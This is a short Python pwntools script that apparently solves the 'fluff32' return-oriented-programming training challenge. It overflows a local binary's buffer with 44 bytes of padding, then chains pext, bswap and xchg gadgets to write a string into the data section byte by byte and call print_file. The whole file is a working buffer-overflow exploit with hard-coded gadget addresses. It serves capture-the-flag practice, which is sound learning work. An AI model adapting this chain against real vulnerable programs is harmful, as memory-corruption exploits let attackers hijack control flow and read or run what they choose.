#!/bin/python3

from pwn import *

p = process("./fluff32")

'''
# For debugging with r2
# ---------------------

pid = util.proc.pidof(p)[0]
print("The pid is " + str(pid))
util.proc.wait_for_debugger(pid)

'''

p.recvuntil(">")

# Gadgets
pop_ecx_bswap_ecx = p32(0x08048558)

pop_ebp = p32(0x080485bb)
pop_ebx = p32(0x080485d6)
pop_edx_ecx = p32(0xf7ed755a)

pext_edx_ebx_eax = p32(0x0804854a)
pext_gadget = p32(0x08048543)
mov_eax_deadbeef = p32(0x0804854f)

xchg_ecx_dl = p32(0x08048555)

print_file = p32(0x080483d0)

flag = [0x4B4B, 0x6DD, 0x5D46, 0x4B5A, 0x5DB, 0x4ACD, 0x5AC5, 0x4ACD]

data_section = 0x0804a018
test_section = 0x08048555

# Payload
payload = b""
payload += b"A" * 44

#---------------
for i in range(8):

    payload += pop_ebp
    payload += p32(flag[i])
    payload += pext_gadget


    # Writing
    payload += pop_ecx_bswap_ecx
    payload += p32(data_section + i, endian="big")
    payload += xchg_ecx_dl
#---------------

payload += print_file
payload += p32(0x0)
payload += p32(data_section)

p.sendline(payload)

print(p.recvall())

